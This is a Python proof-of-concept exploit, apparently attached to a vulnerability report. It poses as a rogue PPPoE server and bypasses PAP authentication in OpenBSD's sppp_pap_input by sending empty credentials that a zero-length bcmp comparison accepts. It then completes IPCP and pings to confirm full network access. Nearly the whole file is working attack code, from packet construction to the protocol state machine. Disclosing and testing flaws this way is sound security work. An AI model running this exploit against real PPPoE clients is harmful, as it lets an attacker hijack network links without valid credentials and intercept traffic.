#!/usr/bin/env python3
"""
PoC for report-001: PAP authentication bypass in sppp_pap_input (CWE-1023).

This script acts as a PPPoE SERVER. The OpenBSD VM's pppoe0 is a PPPoE client
with peerproto=pap, meaning it demands that the peer (us) authenticate via PAP.
After LCP completes, we send a PAP Auth-Request with name_len=0, passwd_len=0.

At if_spppsubr.c:3816, bcmp(name, sp->hisauth.name, 0) returns 0 regardless of
the configured secret. The fail-branch is never taken, so PAP_ACK is sent and
the link opens without valid credentials.

After PAP_ACK the PoC completes IPCP and sends an ICMP echo to confirm full
network-layer access through the rogue server.

OpenBSD VM setup (as root):
  ifconfig pppoe0 create
  ifconfig pppoe0 pppoedev vio0
  ifconfig pppoe0 peerproto pap peername "testuser" peerkey "hunter2"
  ifconfig pppoe0 10.0.0.1 10.0.0.2 netmask 255.255.255.255 up

Usage:
  sudo python3 poc-001-pap-bypass.py [--iface tap0]
"""

import socket
import struct
import sys
import argparse
import random
import time
from scapy.all import (
    Ether, Raw, IP, ICMP, sendp, get_if_hwaddr, get_if_list, AsyncSniffer
)

ETH_DISC = 0x8863
ETH_SESS = 0x8864

PADI = 0x09
PADO = 0x07
PADR = 0x19
PADS = 0x65

TAG_SVC_NAME  = 0x0101
TAG_AC_NAME   = 0x0102
TAG_HOST_UNIQ = 0x0103

PPP_LCP  = 0xc021
PPP_PAP  = 0xc023
PPP_IPCP = 0x8021
PPP_IP   = 0x0021

LCP_CONF_REQ = 1
LCP_CONF_ACK = 2
LCP_CONF_NAK = 3
LCP_CONF_REJ = 4

OPT_MAGIC = 0x05

PAP_REQ = 1
PAP_ACK = 2
PAP_NAK = 3

IPCP_CONF_REQ = 1
IPCP_CONF_ACK = 2
IPCP_CONF_NAK = 3
IPCP_CONF_REJ = 4
IPCP_OPT_ADDR = 3

PING_ID = 0x1337


# packet builders

def pppoe_disc(src_mac, dst_mac, code, session_id, tags_bytes):
    hdr = struct.pack('>BBHH', 0x11, code, session_id, len(tags_bytes))
    return Ether(src=src_mac, dst=dst_mac, type=ETH_DISC) / Raw(hdr + tags_bytes)

def tag(t, value=b''):
    return struct.pack('>HH', t, len(value)) + value

def pppoe_sess(src_mac, dst_mac, session_id, ppp_proto, payload):
    pppoe_hdr = struct.pack('>BBHH', 0x11, 0x00, session_id, len(payload) + 2)
    ppp_hdr   = struct.pack('>H', ppp_proto)
    return Ether(src=src_mac, dst=dst_mac, type=ETH_SESS) / Raw(pppoe_hdr + ppp_hdr + payload)

def lcp_pkt(code, ident, options=b''):
    return struct.pack('>BBH', code, ident, 4 + len(options)) + options

def lcp_opt(opt_type, value):
    return struct.pack('>BB', opt_type, 2 + len(value)) + value

def pap_req(ident, name=b'', password=b''):
    length = 6 + len(name) + len(password)
    return (struct.pack('>BBH', PAP_REQ, ident, length) +
            struct.pack('>B', len(name)) + name +
            struct.pack('>B', len(password)) + password)

def ipcp_pkt(code, ident, options=b''):
    return struct.pack('>BBH', code, ident, 4 + len(options)) + options

def ipcp_opt_addr(ip_str):
    return struct.pack('>BB', IPCP_OPT_ADDR, 6) + socket.inet_aton(ip_str)


# parsers

def parse_pppoe_disc(raw):
    if len(raw) < 6:
        return None
    ver_type, code, session_id, length = struct.unpack('>BBHH', raw[:6])
    tags = {}
    pos = 6
    while pos + 4 <= len(raw):
        t, l = struct.unpack('>HH', raw[pos:pos+4])
        v = raw[pos+4:pos+4+l]
        tags[t] = v
        pos += 4 + l
    return code, session_id, tags

def parse_pppoe_sess(raw):
    if len(raw) < 8:
        return None
    _, _, session_id, _ = struct.unpack('>BBHH', raw[:6])
    ppp_proto = struct.unpack('>H', raw[6:8])[0]
    return session_id, ppp_proto, raw[8:]

def parse_lcp(payload):
    if len(payload) < 4:
        return None
    code, ident, length = struct.unpack('>BBH', payload[:4])
    return code, ident, payload[4:length]


# main state machine

def run(iface, our_ip="10.0.0.2", peer_ip="10.0.0.1", timeout=300):
    src_mac    = get_if_hwaddr(iface)
    magic      = random.randint(1, 0xffffffff)
    session_id = random.randint(1, 0xfffe)

    state = {
        'phase': 'WAIT_PADI',
        'client_mac': None,
        'our_lcp_acked':  False,
        'their_lcp_acked': False,
        'pap_sent': False,
        'our_ipcp_acked':  False,
        'their_ipcp_acked': False,
        'ipcp_sent': False,
        'ping_sent': False,
        'lcp_id': 1,
        'pap_id': 1,
        'ipcp_id': 1,
    }
    result = {'done': False}

    def send_ipcp_req():
        opts = ipcp_opt_addr(our_ip)
        sendp(pppoe_sess(src_mac, state['client_mac'], session_id, PPP_IPCP,
                          ipcp_pkt(IPCP_CONF_REQ, state['ipcp_id'], opts)),
              iface=iface, verbose=False)
        print(f"  IPCP Config-Request sent (addr={our_ip})")

    def maybe_send_ping():
        if state['our_ipcp_acked'] and state['their_ipcp_acked'] and not state['ping_sent']:
            state['ping_sent'] = True
            state['phase'] = 'UP'
            print(f"  IPCP open — link is UP (us={our_ip} peer={peer_ip})")
            print()
            print(f"  Sending ICMP echo to {peer_ip}...")
            raw_ip = bytes(IP(src=our_ip, dst=peer_ip, ttl=64) /
                           ICMP(type=8, code=0, id=PING_ID, seq=1))
            sendp(pppoe_sess(src_mac, state['client_mac'], session_id, PPP_IP, raw_ip),
                  iface=iface, verbose=False)

    def handle(pkt):
        if result['done']:
            return

        raw     = bytes(pkt)
        eth_src = pkt.src if hasattr(pkt, 'src') else None
        etype   = pkt.type if hasattr(pkt, 'type') else 0
        payload = raw[14:]

        # PPPoE Discovery
        if etype == ETH_DISC:
            parsed = parse_pppoe_disc(payload)
            if not parsed:
                return
            code, sid, tags = parsed

            if code == PADI and state['phase'] == 'WAIT_PADI':
                print(f"  PADI from {eth_src}")
                state['client_mac'] = eth_src
                state['phase'] = 'WAIT_PADR'
                pado_tags = (tag(TAG_SVC_NAME) +
                             tag(TAG_AC_NAME, b'poc-ac') +
                             tag(TAG_HOST_UNIQ, tags.get(TAG_HOST_UNIQ, b'')))
                sendp(pppoe_disc(src_mac, eth_src, PADO, 0, pado_tags),
                      iface=iface, verbose=False)
                print("  PADO sent")

            elif code == PADR and state['phase'] == 'WAIT_PADR':
                if eth_src != state['client_mac']:
                    return
                print("  PADR received")
                state['phase'] = 'LCP'
                pads_tags = (tag(TAG_SVC_NAME) +
                             tag(TAG_HOST_UNIQ, tags.get(TAG_HOST_UNIQ, b'')))
                sendp(pppoe_disc(src_mac, eth_src, PADS, session_id, pads_tags),
                      iface=iface, verbose=False)
                print(f"  PADS sent session_id=0x{session_id:04x}")
                opts = lcp_opt(OPT_MAGIC, struct.pack('>I', magic))
                sendp(pppoe_sess(src_mac, eth_src, session_id, PPP_LCP,
                                  lcp_pkt(LCP_CONF_REQ, state['lcp_id'], opts)),
                      iface=iface, verbose=False)
                print(f"  LCP Config-Request sent (magic=0x{magic:08x})")

        # PPPoE Session
        elif etype == ETH_SESS and state['phase'] not in ('WAIT_PADI', 'WAIT_PADR'):
            parsed = parse_pppoe_sess(payload)
            if not parsed:
                return
            sid, proto, ppp_payload = parsed
            if sid != session_id:
                return

            # LCP
            if proto == PPP_LCP and state['phase'] in ('LCP', 'AUTH'):
                lcp = parse_lcp(ppp_payload)
                if not lcp:
                    return
                code, ident, options = lcp

                if code == LCP_CONF_REQ:
                    auth_proto = None
                    pos = 0
                    while pos + 2 <= len(options):
                        ot, ol = options[pos], options[pos+1]
                        if ol < 2:
                            break
                        if ot == 0x03 and ol >= 4:
                            auth_proto = struct.unpack('>H', options[pos+2:pos+4])[0]
                        pos += ol
                    auth_str = (f" auth=0x{auth_proto:04x}" if auth_proto
                                else " (no auth option)")
                    print(f"  LCP Config-Request from client (id={ident}){auth_str}, "
                          "sending Ack")
                    sendp(pppoe_sess(src_mac, state['client_mac'], session_id, PPP_LCP,
                                     lcp_pkt(LCP_CONF_ACK, ident, options)),
                          iface=iface, verbose=False)
                    state['their_lcp_acked'] = True

                elif code == LCP_CONF_ACK:
                    print(f"  LCP Config-Ack received (id={ident})")
                    state['our_lcp_acked'] = True

                elif code in (LCP_CONF_NAK, LCP_CONF_REJ):
                    print(f"  LCP Config-Nak/Rej (id={ident}) — resending minimal config")
                    state['lcp_id'] += 1
                    opts = lcp_opt(OPT_MAGIC, struct.pack('>I', magic))
                    sendp(pppoe_sess(src_mac, state['client_mac'], session_id, PPP_LCP,
                                     lcp_pkt(LCP_CONF_REQ, state['lcp_id'], opts)),
                          iface=iface, verbose=False)

                if (state['our_lcp_acked'] and state['their_lcp_acked']
                        and not state['pap_sent']):
                    state['phase'] = 'AUTH'
                    state['pap_sent'] = True
                    print()
                    print("  LCP open — waiting for OpenBSD to enter "
                          "PHASE_AUTHENTICATE...")
                    time.sleep(0.5)
                    print("  Sending PAP Auth-Request with name_len=0, passwd_len=0")
                    sendp(pppoe_sess(src_mac, state['client_mac'], session_id, PPP_PAP,
                                     pap_req(state['pap_id'])),
                          iface=iface, verbose=False)

            # PAP
            elif proto == PPP_PAP and state['phase'] == 'AUTH':
                if len(ppp_payload) < 4:
                    return
                code, ident = ppp_payload[0], ppp_payload[1]

                if code == PAP_ACK:
                    print()
                    print(" PAP_ACK received with empty credentials")
                    print("   VM accepted name_len=0, passwd_len=0 as valid auth.")
                    print()
                    state['phase'] = 'IPCP'
                    state['ipcp_sent'] = True
                    send_ipcp_req()

                elif code == PAP_NAK:
                    print()
                    print(" NOT BYPASSED — PAP_NAK received")
                    result['done'] = True

            # IPCP
            elif proto == PPP_IPCP and state['phase'] in ('IPCP', 'UP'):
                if len(ppp_payload) < 4:
                    return
                code, ident = ppp_payload[0], ppp_payload[1]
                length = struct.unpack('>H', ppp_payload[2:4])[0]
                options = ppp_payload[4:length]

                if code == IPCP_CONF_REQ:
                    print(f"  IPCP Config-Request from VM (id={ident}), sending Ack")
                    sendp(pppoe_sess(src_mac, state['client_mac'], session_id, PPP_IPCP,
                                     ipcp_pkt(IPCP_CONF_ACK, ident, options)),
                          iface=iface, verbose=False)
                    state['their_ipcp_acked'] = True
                    maybe_send_ping()

                elif code == IPCP_CONF_ACK:
                    print(f"  IPCP Config-Ack received (id={ident})")
                    state['our_ipcp_acked'] = True
                    maybe_send_ping()

                elif code in (IPCP_CONF_NAK, IPCP_CONF_REJ):
                    # Use suggested address from NAK if provided
                    new_ip = our_ip
                    if code == IPCP_CONF_NAK and len(options) >= 6:
                        if options[0] == IPCP_OPT_ADDR and options[1] == 6:
                            new_ip = socket.inet_ntoa(options[2:6])
                    print(f"  IPCP Config-Nak/Rej — retrying with addr={new_ip}")
                    state['ipcp_id'] += 1
                    opts = ipcp_opt_addr(new_ip)
                    sendp(pppoe_sess(src_mac, state['client_mac'], session_id, PPP_IPCP,
                                     ipcp_pkt(IPCP_CONF_REQ, state['ipcp_id'], opts)),
                          iface=iface, verbose=False)

            # IP (ping reply)
            elif proto == PPP_IP and state['phase'] == 'UP':
                try:
                    ip = IP(ppp_payload)
                    if ip.proto == 1:
                        icmp = ip[ICMP]
                        if icmp.type == 0 and icmp.id == PING_ID:
                            print(f"  ICMP echo reply from {ip.src}")
                            print()
                            print(" FULL LINK ESTABLISHED")
                            result['done'] = True
                except Exception:
                    pass

    sniffer = AsyncSniffer(
        iface=iface, timeout=timeout,
        lfilter=lambda p: p.haslayer('Ether') and
                          p['Ether'].type in (ETH_DISC, ETH_SESS) and
                          p['Ether'].src != src_mac,
        prn=handle
    )
    sniffer.start()
    print(f"Listening on {iface} for PPPoE client (PADI)... (timeout={timeout}s)")

    sniffer.join(timeout=timeout)

    if not result['done']:
        print("\nTimeout.")
        phase = state['phase']
        if phase == 'WAIT_PADI':
            print("  No PADI received.")
        elif phase == 'WAIT_PADR':
            print("  Got PADI/sent PADO but no PADR.")
        elif phase == 'LCP':
            print(f"  Stuck in LCP. our={state['our_lcp_acked']} "
                  f"their={state['their_lcp_acked']}")
        elif phase == 'AUTH':
            print("  LCP open but no PAP response.")
        elif phase == 'IPCP':
            print(f"  PAP bypassed but stuck in IPCP. "
                  f"our={state['our_ipcp_acked']} their={state['their_ipcp_acked']}")
        elif phase == 'UP':
            print("  IPCP open but no ICMP reply.")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--iface",    default="tap0")
    parser.add_argument("--our-ip",  default="10.0.0.2")
    parser.add_argument("--peer-ip", default="10.0.0.1")
    parser.add_argument("--timeout", default=300, type=int,
                        help="seconds to wait for PADI (default: 300)")
    args = parser.parse_args()

    if args.iface not in get_if_list():
        print(f"ERROR: interface {args.iface} not found", file=sys.stderr)
        sys.exit(1)

    run(args.iface, args.our_ip, args.peer_ip, args.timeout)


if __name__ == "__main__":
    main()
